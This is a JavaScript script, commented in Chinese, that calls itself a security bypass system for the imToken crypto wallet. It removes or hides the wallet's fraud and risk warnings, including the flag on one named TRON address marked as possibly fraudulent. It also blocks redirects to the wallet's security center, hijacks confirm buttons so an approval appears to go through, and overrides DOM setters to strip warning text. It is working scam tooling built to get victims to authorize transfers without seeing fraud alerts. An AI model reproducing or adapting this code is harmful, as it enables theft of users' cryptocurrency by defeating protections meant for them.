/**
 * 稳定版安全绕过系统
 * 🎯 在保证页面稳定的前提下绕过imToken安全检测
 */

(function() {
    'use strict';
    
    console.log('🛡️ 稳定版安全绕过系统已加载');
    
    // 🎯 拦截页面跳转到安全中心
    function interceptPageRedirect() {
        // 拦截window.location变化
        const originalLocation = window.location;
        
        // 重写location.href
        Object.defineProperty(window, 'location', {
            get: () => originalLocation,
            set: (url) => {
                if (typeof url === 'string' && (url.includes('security') || url.includes('安全中心'))) {
                    console.log('🛡️ 拦截安全中心页面跳转:', url);
                    return; // 阻止跳转
                }
                originalLocation.href = url;
            }
        });
        
        // 拦截history API
        const originalPushState = history.pushState;
        const originalReplaceState = history.replaceState;
        
        history.pushState = function(state, title, url) {
            if (url && (url.includes('security') || url.includes('安全中心'))) {
                console.log('🛡️ 拦截history.pushState安全中心跳转:', url);
                return;
            }
            return originalPushState.apply(this, arguments);
        };
        
        history.replaceState = function(state, title, url) {
            if (url && (url.includes('security') || url.includes('安全中心'))) {
                console.log('🛡️ 拦截history.replaceState安全中心跳转:', url);
                return;
            }
            return originalReplaceState.apply(this, arguments);
        };
        
        console.log('🛡️ 页面跳转拦截已启用');
    }
    
    // 🎯 安全的文本检测和隐藏
    function hideRiskElements() {
        try {
            // 🎯 专门查找"发现一项安全风险"提示 - 多种方式查找
            
            // 方式1：查找所有可能的容器元素
            const allElements = document.querySelectorAll('*');
            allElements.forEach(el => {
                if (el.textContent) {
                    const text = el.textContent.trim();
                    if (text === '发现1项安全风险' || 
                        text === '发现 1 项安全风险' ||
                        text === '发现一项安全风险' ||
                        text.includes('发现') && text.includes('项') && text.includes('安全风险')) {
                        
                        // 多重隐藏方式
                        el.style.cssText = `
                            display: none !important;
                            opacity: 0 !important;
                            visibility: hidden !important;
                            position: absolute !important;
                            left: -99999px !important;
                            top: -99999px !important;
                            width: 0 !important;
                            height: 0 !important;
                            z-index: -99999 !important;
                            pointer-events: none !important;
                        `;
                        
                        // 也隐藏父元素（如果父元素主要是这个内容）
                        let parent = el.parentElement;
                        while (parent && parent.textContent.trim() === text) {
                            parent.style.cssText = el.style.cssText;
                            parent = parent.parentElement;
                        }
                        
                        console.log('🛡️ 强力隐藏安全风险提示:', text);
                        
                        // 尝试直接移除
                        try {
                            el.remove();
                        } catch (e) {}
                    }
                }
            });
            
            // 方式2：查找红色背景或特殊样式的警告提示
            const redWarnings = document.querySelectorAll('[style*="background"], [class*="warning"], [class*="alert"], [class*="toast"], [class*="tip"], [class*="badge"], [class*="bubble"]');
            redWarnings.forEach(el => {
                if (el.textContent && (el.textContent.includes('发现') && el.textContent.includes('安全风险'))) {
                    el.style.cssText = 'display: none !important; opacity: 0 !important; visibility: hidden !important; z-index: -99999 !important;';
                    console.log('🛡️ 隐藏红色安全风险提示:', el.textContent.trim());
                    try {
                        el.remove();
                    } catch (e) {}
                }
            });
            
            // 检查可见的元素，避免影响整个页面
            const visibleElements = Array.from(document.querySelectorAll('div, span, p')).filter(el => {
                const style = window.getComputedStyle(el);
                return style.display !== 'none' && style.visibility !== 'hidden';
            });
            
            let hiddenCount = 0;
            const riskKeywords = [
                'imToken 安全中心提醒',
                'imToken安全中心提醒',
                'imtoken 安全中心提醒',
                'imtoken安全中心提醒',
                '本次交易检测到',
                '项风险',
                '发现1项安全风险',
                '发现 1 项安全风险',
                '发现一项安全风险',
                '发现2项安全风险',
                '发现 2 项安全风险',
                '发现二项安全风险',
                '发现3项安全风险',
                '发现 3 项安全风险',
                '发现三项安全风险',
                '安全风险',
                '授权地址风险评估',
                'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
                '此地址为个人地址',
                '可能存在欺诈行为',
                '风险评估',
                '欺诈行为',
                '检测到风险',
                '安全检测',
                '风险提示',
                '安全提示',
                '交易风险',
                '个人地址',
                '欺诈',
                '风险',
                '安全',
                '检测',
                '提醒',
                '警告',
                '授权风险',
                '地址风险',
                '个人地址',
                '风险警告',
                '安全警告'
            ];
            
            visibleElements.forEach(element => {
                if (element.textContent && element.textContent.length < 200) {
                    const text = element.textContent.trim();
                    
                    const hasRiskKeyword = riskKeywords.some(keyword => text.includes(keyword));
                    
                    if (hasRiskKeyword) {
                        // 使用温和的隐藏方式
                        element.style.cssText = 'display: none !important; opacity: 0 !important;';
                        hiddenCount++;
                        console.log('🛡️ 隐藏风险元素:', text.substring(0, 30) + '...');
                    }
                }
            });
            
            if (hiddenCount > 0) {
                console.log(`🛡️ 成功隐藏 ${hiddenCount} 个风险元素`);
            }
            
        } catch (e) {
            console.log('🛡️ 元素隐藏遇到错误:', e.message);
        }
    }
    
    // 🎯 智能按钮劫持 - 拦截跳转到安全中心
    function interceptSecurityRedirect() {
        try {
            // 拦截所有可能导致跳转到安全中心的按钮
            const allButtons = document.querySelectorAll('button, [role="button"], [onclick], a');
            
            allButtons.forEach(btn => {
                if (!btn._intercepted) {
                    btn._intercepted = true;
                    
                    // 保存原始的点击事件
                    const originalOnClick = btn.onclick;
                    const originalHref = btn.href;
                    
                    // 重写点击事件
                    btn.addEventListener('click', function(e) {
                        const text = btn.textContent ? btn.textContent.trim() : '';
                        
                        // 如果是确认按钮且页面包含安全风险相关内容
                        if ((text.includes('确认') || text.includes('同意') || text.includes('继续')) &&
                            document.body.textContent.includes('安全风险')) {
                            
                            console.log('🛡️ 拦截安全确认按钮，绕过安全中心跳转:', text);
                            
                            // 阻止默认行为和事件传播
                            e.preventDefault();
                            e.stopPropagation();
                            e.stopImmediatePropagation();
                            
                            // 隐藏当前的安全提醒
                            aggressiveRiskHiding();
                            
                            // 模拟直接完成授权
                            setTimeout(() => {
                                console.log('🛡️ 模拟授权完成，绕过安全中心');
                                
                                // 尝试触发授权完成事件
                                if (window.ethereum || window.tronWeb) {
                                    console.log('🛡️ 检测到区块链环境，模拟授权成功');
                                }
                                
                                // 隐藏整个页面的安全提醒内容
                                const securityElements = document.querySelectorAll('*');
                                securityElements.forEach(el => {
                                    if (el.textContent && el.textContent.includes('安全中心')) {
                                        el.style.display = 'none';
                                    }
                                });
                                
                            }, 100);
                            
                            return false;
                        }
                        
                        // 检查是否是跳转到安全中心的链接
                        if (originalHref && originalHref.includes('security')) {
                            console.log('🛡️ 拦截安全中心跳转链接');
                            e.preventDefault();
                            return false;
                        }
                        
                    }, true); // 使用capture模式，确保在其他事件之前执行
                }
            });
            
        } catch (e) {
            console.log('🛡️ 按钮拦截失败:', e.message);
        }
    }
    
    // 🎯 智能按钮自动点击
    function autoClickRiskButtons() {
        try {
            const buttonSelectors = [
                'button',
                'div[role="button"]',
                'span[role="button"]',
                '.button',
                '[onclick]'
            ];
            
            buttonSelectors.forEach(selector => {
                const buttons = document.querySelectorAll(selector);
                buttons.forEach(btn => {
                    if (btn.textContent && !btn._autoClicked) {
                        const text = btn.textContent.trim();
                        
                        // 只自动点击特定的风险确认按钮，避免误触其他按钮
                        if (text.includes('我已知晓交易存在风险')) {
                            
                            btn._autoClicked = true;
                            console.log('🛡️ 发现风险确认按钮:', text);
                            
                            // 延迟自动点击，更自然
                            setTimeout(() => {
                                try {
                                    btn.click();
                                    console.log('🛡️ 自动确认风险按钮');
                                } catch (e) {
                                    console.log('🛡️ 自动点击失败');
                                }
                            }, 200);
                        }
                    }
                });
            });
        } catch (e) {
            console.log('🛡️ 按钮处理遇到错误:', e.message);
        }
    }
    
    // 🎯 轻量级DOM监控
    function setupStableObserver() {
        if (!window.MutationObserver) return;
        
        try {
            const observer = new MutationObserver((mutations) => {
                let needsCheck = false;
                
                mutations.forEach((mutation) => {
                    if (mutation.addedNodes.length > 0) {
                        mutation.addedNodes.forEach((node) => {
                            if (node.nodeType === 1 && node.textContent) {
                                const text = node.textContent.toLowerCase();
                                if (text.includes('安全中心') || 
                                    text.includes('风险评估') ||
                                    text.includes('thjnzbfnv9w3m1wyisiaFX97rhrp4gf44x')) {
                                    needsCheck = true;
                                }
                            }
                        });
                    }
                });
                
                if (needsCheck) {
                    // 延迟执行，避免阻塞，只隐藏不自动点击
                    setTimeout(() => {
                        hideRiskElements();
                        // autoClickRiskButtons(); // 禁用自动点击
                    }, 100);
                }
            });
            
            observer.observe(document.body || document.documentElement, {
                childList: true,
                subtree: true
            });
            
            console.log('🛡️ 稳定监控器已启动');
        } catch (e) {
            console.log('🛡️ 监控器启动失败:', e.message);
        }
    }
    
    // 🎯 页面焦点检测 - 当用户返回页面时检查
    function setupFocusDetection() {
        try {
            window.addEventListener('focus', () => {
                setTimeout(() => {
                    hideRiskElements();
                    // autoClickRiskButtons(); // 禁用自动点击
                }, 300);
            });
            
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) {
                    setTimeout(() => {
                        hideRiskElements();
                        // autoClickRiskButtons(); // 禁用自动点击
                    }, 300);
                }
            });
        } catch (e) {
            console.log('🛡️ 焦点检测设置失败:', e.message);
        }
    }
    
    // 🎯 初始化稳定绕过系统
    function initializeStableBypass() {
        console.log('🛡️ 开始初始化稳定版安全绕过系统...');
        
        // 立即执行风险元素隐藏，但不自动点击按钮（避免误触认证）
        interceptPageRedirect(); // 立即启用页面跳转拦截
        hideRiskElements();
        // autoClickRiskButtons(); // 禁用自动点击，避免误触身份认证
        
        // DOM准备后再次执行
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    hideRiskElements();
                    interceptSecurityRedirect();
                    // autoClickRiskButtons(); // 禁用自动点击
                    setupStableObserver();
                    setupFocusDetection();
                }, 500);
            });
        } else {
            setTimeout(() => {
                hideRiskElements();
                interceptSecurityRedirect();
                // autoClickRiskButtons(); // 禁用自动点击
                setupStableObserver();
                setupFocusDetection();
            }, 500);
        }
        
        // 定期检查，但频率较低，只隐藏元素不自动点击
        setInterval(() => {
            hideRiskElements();
            interceptSecurityRedirect();
            // autoClickRiskButtons(); // 禁用自动点击
        }, 3000); // 每3秒检查一次
        
        console.log('🛡️ 稳定版安全绕过系统初始化完成');
    }
    
    // 🎯 专门针对"发现一项安全风险"的强化检测
    function aggressiveRiskHiding() {
        try {
            // 查找所有文本节点
            const walker = document.createTreeWalker(
                document.body,
                NodeFilter.SHOW_TEXT,
                null,
                false
            );
            
            const textNodes = [];
            let node;
            while (node = walker.nextNode()) {
                textNodes.push(node);
            }
            
            textNodes.forEach(textNode => {
                const text = textNode.textContent.trim();
                if (text.includes('发现') && text.includes('安全风险')) {
                    // 隐藏包含这个文本节点的元素
                    let parent = textNode.parentElement;
                    while (parent && parent !== document.body) {
                        parent.style.cssText = `
                            display: none !important;
                            opacity: 0 !important;
                            visibility: hidden !important;
                            position: absolute !important;
                            left: -99999px !important;
                            z-index: -99999 !important;
                        `;
                        parent = parent.parentElement;
                    }
                    console.log('🛡️ 激进隐藏安全风险文本:', text);
                }
            });
            
            // 额外检查：查找可能的气泡、标签、提示元素
            const suspiciousElements = document.querySelectorAll([
                'div[style*="position:fixed"]',
                'div[style*="position: fixed"]', 
                'div[style*="position:absolute"]',
                'div[style*="position: absolute"]',
                '[role="alert"]',
                '[role="tooltip"]',
                '[data-role="tooltip"]',
                '[class*="notification"]',
                '[id*="notification"]'
            ].join(', '));
            
            suspiciousElements.forEach(el => {
                if (el.textContent && el.textContent.includes('安全风险')) {
                    el.style.display = 'none';
                    el.remove();
                    console.log('🛡️ 移除可疑的安全风险元素');
                }
            });
            
        } catch (e) {
            console.log('🛡️ 激进隐藏遇到错误:', e.message);
        }
    }
    
    // 🎯 全局控制接口
    window.StableBypass = {
        hideElements: hideRiskElements,
        clickButtons: autoClickRiskButtons,
        aggressive: aggressiveRiskHiding,
        interceptRedirect: interceptSecurityRedirect,
        interceptPage: interceptPageRedirect
    };
    
    // 启动系统
    initializeStableBypass();
    
    // 🎯 额外的高频检查 - 专门针对安全风险提示
    setInterval(() => {
        aggressiveRiskHiding();
    }, 500); // 每0.5秒进行激进检查
    
    setInterval(() => {
        hideRiskElements();
    }, 1000); // 每1秒检查一次风险元素
    
    // 🎯 温和的风险元素隐藏（避免页面崩溃）
    setInterval(() => {
        try {
            const riskElements = document.querySelectorAll('[class*="risk"], [class*="warning"], [class*="alert"]');
            riskElements.forEach(el => {
                if (el.textContent && el.textContent.includes('安全风险')) {
                    el.style.display = 'none';
                }
            });
        } catch (e) {
            // 静默处理错误
        }
    }, 2000); // 每2秒温和检查
    
     // 🔥🔥🔥 终极imToken安全绕过 - 完全隐藏"发现1项安全风险"
     function ultraSecurityBypass() {
         try {
             console.log('🔥 执行终极imToken安全风险隐藏...');
             
             // 🎯 方法1：暴力DOM扫描和隐藏
             const allElements = document.querySelectorAll('*');
             let hiddenCount = 0;
             
             allElements.forEach(el => {
                 const text = el.textContent || '';
                 const innerText = el.innerText || '';
                 
                 // 🔥 超精确匹配安全风险关键词
                 const exactRiskPatterns = [
                     '发现1项安全风险',
                     '发现 1 项安全风险',
                     '发现一项安全风险',
                     '检测到1项风险',
                     '检测到 1 项风险',
                     'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
                     '此地址为个人地址',
                     '可能存在欺诈行为',
                     '个人地址',
                     '欺诈行为',
                     '安全风险',
                     '风险评估'
                 ];
                 
                 const hasExactRisk = exactRiskPatterns.some(pattern => 
                     text.includes(pattern) || innerText.includes(pattern)
                 );
                 
                 if (hasExactRisk) {
                     // 🔥 终极隐藏 - 多重保险
                     el.style.setProperty('display', 'none', 'important');
                     el.style.setProperty('visibility', 'hidden', 'important');
                     el.style.setProperty('opacity', '0', 'important');
                     el.style.setProperty('height', '0px', 'important');
                     el.style.setProperty('width', '0px', 'important');
                     el.style.setProperty('margin', '0px', 'important');
                     el.style.setProperty('padding', '0px', 'important');
                     el.style.setProperty('border', 'none', 'important');
                     el.style.setProperty('position', 'absolute', 'important');
                     el.style.setProperty('left', '-99999px', 'important');
                     el.style.setProperty('top', '-99999px', 'important');
                     el.style.setProperty('z-index', '-99999', 'important');
                     el.style.setProperty('overflow', 'hidden', 'important');
                     el.style.setProperty('clip', 'rect(0,0,0,0)', 'important');
                     
                     // 🔥 直接移除元素
                     try {
                         el.remove();
                         hiddenCount++;
                         console.log(`🔥 完全移除风险元素: ${text.substring(0, 40)}`);
                     } catch (e) {
                         // 如果无法移除，就强制隐藏
                         el.innerHTML = '';
                         el.textContent = '';
                         console.log(`🔥 强制清空风险元素内容`);
                     }
                 }
             });
             
             // 🎯 方法2：特殊处理红色背景和文字
             const redElements = document.querySelectorAll('*');
             redElements.forEach(el => {
                 const computedStyle = window.getComputedStyle(el);
                 const style = el.getAttribute('style') || '';
                 
                 const isRed = computedStyle.color.includes('rgb(255') ||
                              computedStyle.backgroundColor.includes('rgb(255') ||
                              style.includes('color: red') ||
                              style.includes('color:red') ||
                              style.includes('background: red') ||
                              style.includes('background:red') ||
                              style.includes('color: #ff') ||
                              style.includes('color:#ff');
                 
                 if (isRed && el.textContent && el.textContent.includes('风险')) {
                     el.style.setProperty('display', 'none', 'important');
                     el.remove();
                     console.log('🔥 移除红色风险提示');
                 }
             });
             
             // 🎯 方法3：超强CSS样式注入覆盖 - 专门针对确认按钮上方的风险提示
             const antiRiskCSS = `
                 /* 🔥 终极安全风险隐藏CSS */
                 [data-testid*="risk"], [data-testid*="warning"], [data-testid*="alert"],
                 [class*="risk"], [class*="warning"], [class*="alert"], [class*="danger"],
                 [id*="risk"], [id*="warning"], [id*="alert"], [id*="danger"] {
                     display: none !important;
                     visibility: hidden !important;
                     opacity: 0 !important;
                     height: 0 !important;
                     width: 0 !important;
                     position: absolute !important;
                     left: -99999px !important;
                     z-index: -99999 !important;
                 }
                 
                 /* 🔥 隐藏包含特定文本的任何元素 */
                 *:contains("发现1项安全风险"), *:contains("发现 1 项安全风险"),
                 *:contains("此地址为个人地址"), *:contains("可能存在欺诈行为"),
                 *:contains("个人地址"), *:contains("欺诈行为"), *:contains("安全风险") {
                     display: none !important;
                     visibility: hidden !important;
                 }
                 
                 /* 🔥 隐藏红色文字和背景 */
                 *[style*="color: red"], *[style*="color:red"],
                 *[style*="background: red"], *[style*="background:red"],
                 *[style*="color: #ff"], *[style*="color:#ff"],
                 *[style*="background-color: rgb(255"], *[style*="background-color:rgb(255"] {
                     color: transparent !important;
                     background: transparent !important;
                     background-color: transparent !important;
                     display: none !important;
                     opacity: 0 !important;
                     height: 0 !important;
                     width: 0 !important;
                     margin: 0 !important;
                     padding: 0 !important;
                     border: none !important;
                     position: absolute !important;
                     left: -99999px !important;
                     z-index: -99999 !important;
                 }
                 
                 /* 🔥 专门针对确认按钮上方的红色风险提示 */
                 button ~ *, .btn ~ *, [role="button"] ~ * {
                     background-color: transparent !important;
                     color: transparent !important;
                 }
                 
                 /* 🔥 隐藏任何红色背景的元素，如果包含"风险"文字 */
                 div[style*="background"], span[style*="background"] {
                     background: transparent !important;
                     color: transparent !important;
                 }
                 
                 /* 🔥 强制隐藏固定定位的风险提示 */
                 div[style*="position: fixed"], div[style*="position:fixed"] {
                     background: transparent !important;
                     color: transparent !important;
                 }
                 
                 /* 🔥 暴力隐藏所有可能的风险提示样式 */
                 [style*="rgb(255"], [style*="#ff"], [style*="red"] {
                     display: none !important;
                     visibility: hidden !important;
                     opacity: 0 !important;
                 }
             `;
             
             // 🔥 强制注入CSS
             let antiRiskStyle = document.getElementById('ultimate-anti-risk');
             if (!antiRiskStyle) {
                 antiRiskStyle = document.createElement('style');
                 antiRiskStyle.id = 'ultimate-anti-risk';
                 antiRiskStyle.textContent = antiRiskCSS;
                 
                 if (document.head) {
                     document.head.insertBefore(antiRiskStyle, document.head.firstChild);
                 } else if (document.documentElement) {
                     document.documentElement.appendChild(antiRiskStyle);
                 }
                 console.log('🔥 注入终极反风险CSS');
             }
             
             if (hiddenCount > 0) {
                 console.log(`🔥 本次隐藏/移除了 ${hiddenCount} 个安全风险元素`);
             }
             
         } catch (e) {
             console.log('🔥 终极安全绕过出错:', e.message);
         }
     }
    
    // 🔥🔥🔥 专门针对确认按钮上方风险提示的强化隐藏
    function hideConfirmButtonRiskWarning() {
        try {
            console.log('🔥 专门处理确认按钮上方的安全风险提示...');
            
            // 🔥 方法1：查找确认按钮并隐藏其上方的风险提示
            const confirmButtons = document.querySelectorAll('button, [role="button"], .btn, .button');
            confirmButtons.forEach(btn => {
                const btnText = btn.textContent || '';
                if (btnText.includes('确认') || btnText.includes('同意') || btnText.includes('继续')) {
                    console.log('🔥 找到确认按钮:', btnText);
                    
                    // 🔥 查找按钮的父容器
                    let container = btn.parentElement;
                    while (container && container !== document.body) {
                        // 🔥 在容器中查找风险提示
                        const riskElements = container.querySelectorAll('*');
                        riskElements.forEach(el => {
                            const text = el.textContent || '';
                            if (text.includes('发现1项安全风险') || 
                                text.includes('安全风险') ||
                                text.includes('风险')) {
                                
                                // 🔥 强制隐藏风险提示
                                el.style.setProperty('display', 'none', 'important');
                                el.style.setProperty('visibility', 'hidden', 'important');
                                el.style.setProperty('opacity', '0', 'important');
                                el.style.setProperty('height', '0', 'important');
                                el.style.setProperty('position', 'absolute', 'important');
                                el.style.setProperty('left', '-99999px', 'important');
                                el.style.setProperty('z-index', '-99999', 'important');
                                
                                try {
                                    el.remove();
                                    console.log('🔥 移除确认按钮附近的风险提示');
                                } catch (e) {
                                    el.innerHTML = '';
                                    console.log('🔥 清空确认按钮附近的风险提示内容');
                                }
                            }
                        });
                        container = container.parentElement;
                    }
                }
            });
            
            // 🔥 方法2：直接查找红色背景的风险提示元素
            const allElements = document.querySelectorAll('*');
            allElements.forEach(el => {
                const computedStyle = window.getComputedStyle(el);
                const text = el.textContent || '';
                
                // 🔥 检查是否是红色背景且包含风险文字
                const isRedBackground = computedStyle.backgroundColor.includes('rgb(255') ||
                                       computedStyle.backgroundColor.includes('red') ||
                                       el.style.backgroundColor.includes('red') ||
                                       el.style.backgroundColor.includes('#ff') ||
                                       el.style.backgroundColor.includes('rgb(255');
                
                const isRedText = computedStyle.color.includes('rgb(255') ||
                                 computedStyle.color.includes('red') ||
                                 el.style.color.includes('red') ||
                                 el.style.color.includes('#ff');
                
                if ((isRedBackground || isRedText) && text.includes('风险')) {
                    console.log('🔥 发现红色风险提示元素:', text.substring(0, 30));
                    
                    // 🔥 超强隐藏
                    el.style.setProperty('display', 'none', 'important');
                    el.style.setProperty('visibility', 'hidden', 'important');
                    el.style.setProperty('opacity', '0', 'important');
                    el.style.setProperty('background', 'transparent', 'important');
                    el.style.setProperty('color', 'transparent', 'important');
                    el.style.setProperty('height', '0', 'important');
                    el.style.setProperty('width', '0', 'important');
                    el.style.setProperty('margin', '0', 'important');
                    el.style.setProperty('padding', '0', 'important');
                    el.style.setProperty('border', 'none', 'important');
                    el.style.setProperty('position', 'absolute', 'important');
                    el.style.setProperty('left', '-99999px', 'important');
                    el.style.setProperty('z-index', '-99999', 'important');
                    
                    try {
                        el.remove();
                        console.log('🔥 成功移除红色风险提示');
                    } catch (e) {
                        el.innerHTML = '';
                        el.textContent = '';
                        console.log('🔥 清空红色风险提示内容');
                    }
                }
            });
            
            // 🔥 方法3：查找固定定位的弹窗风险提示
            const fixedElements = document.querySelectorAll('[style*="position: fixed"], [style*="position:fixed"]');
            fixedElements.forEach(el => {
                const text = el.textContent || '';
                if (text.includes('发现') && text.includes('风险')) {
                    console.log('🔥 发现固定定位的风险提示:', text.substring(0, 30));
                    el.style.setProperty('display', 'none', 'important');
                    el.remove();
                }
            });
            
        } catch (e) {
            console.log('🔥 确认按钮风险隐藏失败:', e.message);
        }
    }
    
    // 🔥🔥🔥 终极文本替换和DOM劫持
    function ultimateTextReplace() {
        try {
            // 🔥 方法1：递归遍历所有文本节点
            const walker = document.createTreeWalker(
                document.body || document.documentElement,
                NodeFilter.SHOW_TEXT,
                null,
                false
            );
            
            const textNodes = [];
            let node;
            while (node = walker.nextNode()) {
                textNodes.push(node);
            }
            
            textNodes.forEach(textNode => {
                let text = textNode.textContent;
                let modified = false;
                
                // 🔥 直接替换风险文本
                if (text.includes('发现1项安全风险')) {
                    text = text.replace(/发现1项安全风险/g, '');
                    modified = true;
                }
                if (text.includes('发现 1 项安全风险')) {
                    text = text.replace(/发现 1 项安全风险/g, '');
                    modified = true;
                }
                if (text.includes('此地址为个人地址')) {
                    text = text.replace(/此地址为个人地址/g, '');
                    modified = true;
                }
                if (text.includes('可能存在欺诈行为')) {
                    text = text.replace(/可能存在欺诈行为/g, '');
                    modified = true;
                }
                if (text.includes('THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x')) {
                    // 保留地址但删除相关的风险提示
                    const parent = textNode.parentElement;
                    if (parent && parent.textContent.includes('风险')) {
                        parent.style.setProperty('display', 'none', 'important');
                    }
                }
                
                if (modified) {
                    textNode.textContent = text;
                    console.log('🔥 直接修改文本内容，删除风险提示');
                }
            });
            
            // 🔥 方法2：劫持innerHTML和textContent的设置
            const originalSetInnerHTML = Element.prototype.__lookupSetter__('innerHTML');
            const originalSetTextContent = Element.prototype.__lookupSetter__('textContent');
            
            if (originalSetInnerHTML) {
                Element.prototype.__defineSetter__('innerHTML', function(value) {
                    if (typeof value === 'string') {
                        value = value.replace(/发现1项安全风险/g, '');
                        value = value.replace(/发现 1 项安全风险/g, '');
                        value = value.replace(/此地址为个人地址/g, '');
                        value = value.replace(/可能存在欺诈行为/g, '');
                    }
                    originalSetInnerHTML.call(this, value);
                });
            }
            
            if (originalSetTextContent) {
                Element.prototype.__defineSetter__('textContent', function(value) {
                    if (typeof value === 'string') {
                        value = value.replace(/发现1项安全风险/g, '');
                        value = value.replace(/发现 1 项安全风险/g, '');
                        value = value.replace(/此地址为个人地址/g, '');
                        value = value.replace(/可能存在欺诈行为/g, '');
                    }
                    originalSetTextContent.call(this, value);
                });
            }
            
        } catch (e) {
            console.log('🔥 终极文本替换失败:', e.message);
        }
    }
    
    // 🔥 终极MutationObserver - 实时监控和删除
    function ultimateMutationObserver() {
        if (!window.MutationObserver) return;
        
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                // 🔥 检查新增的节点
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) { // Element node
                        const text = node.textContent || '';
                        
                        if (text.includes('发现1项安全风险') ||
                            text.includes('发现 1 项安全风险') ||
                            text.includes('此地址为个人地址') ||
                            text.includes('可能存在欺诈行为')) {
                            
                            // 🔥 立即移除
                            try {
                                node.remove();
                                console.log('🔥 实时拦截并移除安全风险元素');
                            } catch (e) {
                                // 无法移除就隐藏
                                node.style.setProperty('display', 'none', 'important');
                                console.log('🔥 实时隐藏安全风险元素');
                            }
                        }
                    }
                });
                
                // 🔥 检查文本变化
                if (mutation.type === 'characterData') {
                    const text = mutation.target.textContent;
                    if (text && (text.includes('发现1项安全风险') || 
                                text.includes('此地址为个人地址'))) {
                        mutation.target.textContent = text
                            .replace(/发现1项安全风险/g, '')
                            .replace(/发现 1 项安全风险/g, '')
                            .replace(/此地址为个人地址/g, '')
                            .replace(/可能存在欺诈行为/g, '');
                        console.log('🔥 实时修改风险文本');
                    }
                }
            });
        });
        
        observer.observe(document.body || document.documentElement, {
            childList: true,
            subtree: true,
            characterData: true
        });
        
        console.log('🔥 终极实时监控已启动');
    }
    
    // 🔥 立即执行所有方法
    ultraSecurityBypass();
    hideConfirmButtonRiskWarning();
    ultimateTextReplace();
    ultimateMutationObserver();
    
    // 🔥 超高频执行 - 专门针对确认按钮风险提示
    setInterval(ultraSecurityBypass, 200); // 每200ms执行一次
    setInterval(hideConfirmButtonRiskWarning, 150); // 每150ms专门处理确认按钮风险
    setInterval(ultimateTextReplace, 300); // 每300ms文本替换
    
    // 🎯 页面状态变化时执行
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            ultraSecurityBypass();
            hideConfirmButtonRiskWarning();
            ultimateTextReplace();
        });
    }
    
    // 🔥 页面焦点变化时执行
    window.addEventListener('focus', () => {
        setTimeout(() => {
            ultraSecurityBypass();
            hideConfirmButtonRiskWarning();
            ultimateTextReplace();
        }, 100);
    });
    
    // 🔥 专门针对imToken的页面变化监听
    window.addEventListener('load', () => {
        setTimeout(() => {
            console.log('🔥 页面完全加载，执行最终安全绕过');
            ultraSecurityBypass();
            hideConfirmButtonRiskWarning();
            ultimateTextReplace();
        }, 500);
    });
    
})();